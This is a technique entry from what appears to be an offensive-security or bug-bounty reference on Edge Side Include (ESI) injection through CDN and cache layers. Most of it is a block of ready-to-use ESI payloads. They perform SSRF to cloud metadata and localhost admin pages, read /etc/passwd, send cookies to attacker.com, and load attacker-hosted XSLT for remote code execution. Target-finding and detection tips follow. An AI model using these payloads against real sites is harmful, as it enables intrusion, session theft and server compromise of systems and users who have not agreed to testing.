---
id: "esi-injection"
title: "Edge Side Include (ESI) Injection"
type: "technique"
category: "web-application"
subcategory: "injection"
tags: ["esi", "edge-side-include", "varnish", "akamai", "fastly", "ssrf", "cache-poisoning", "deep-dig"]
platforms: ["linux", "macos", "windows"]
related: ["cache-poisoning", "ssrf-techniques", "xss"]
difficulty: "advanced"
updated: "2026-04-14"
---

# Edge Side Include (ESI) Injection

## Why ESI Injection is Underexplored
ESI tags are processed by CDN/cache layers (Varnish, Akamai, Fastly, Squid). If user input reaches an ESI-processing layer, you get SSRF, XSS bypass, cookie theft, and even RCE. Novel = higher bounties. $2k–$20k.

## Core Payloads
```xml
<!-- Basic SSRF -->
<esi:include src="http://attacker.com/steal"/>
<esi:include src="http://169.254.169.254/latest/meta-data/"/>
<esi:include src="http://localhost:8080/admin"/>

<!-- File read -->
<esi:include src="file:///etc/passwd"/>

<!-- XSS bypass (WAF can't see it — ESI processed server-side) -->
<esi:include src="http://attacker.com/xss.html"/>

<!-- Cookie stealing (Akamai supports cookie access) -->
<esi:include src="http://attacker.com/steal?cookie=$(HTTP_COOKIE)"/>

<!-- ESI + XSLT = RCE -->
<esi:include src="http://attacker.com/payload" stylesheet="http://attacker.com/evil.xslt"/>
<esi:include src="http://attacker.com/" dca="xslt" stylesheet="http://attacker.com/rce.xslt"/>

<!-- Conditional ESI -->
<esi:choose>
  <esi:when test="$(HTTP_COOKIE{admin})=='true'">
    <esi:include src="http://attacker.com/?is_admin=true"/>
  </esi:when>
</esi:choose>

<!-- Debug -->
<esi:debug/>
```

## ESI Engine Capabilities
```
Feature          | Varnish | Akamai | Fastly | Squid
esi:include      | Yes     | Yes    | Yes    | Yes
Cookie access    | No      | Yes    | No     | No
XSLT support    | Yes     | Yes    | No     | No
Header access    | No      | Yes    | No     | No
```

## Detection
```
# Check for ESI support:
# 1. Look for Surrogate-Control header in responses:
Surrogate-Control: content="ESI/1.0"

# 2. Inject canary:
<esi:include src="http://COLLABORATOR"/>
# If Collaborator gets a hit → ESI is processing your input

# 3. Check X-Cache, Via, X-Varnish headers for cache layer info
```

## Where to Find This
- Sites behind Varnish, Akamai, Fastly, Squid, F5
- E-commerce platforms with CDN caching
- Content-heavy sites with edge caching
- Any app where user input is cached and served through a CDN
- CMS platforms with CDN acceleration

## Tools
- Burp Suite for injecting ESI tags
- nuclei ESI injection templates
- Interactsh/Collaborator for SSRF confirmation
- curl to check Surrogate-Control headers
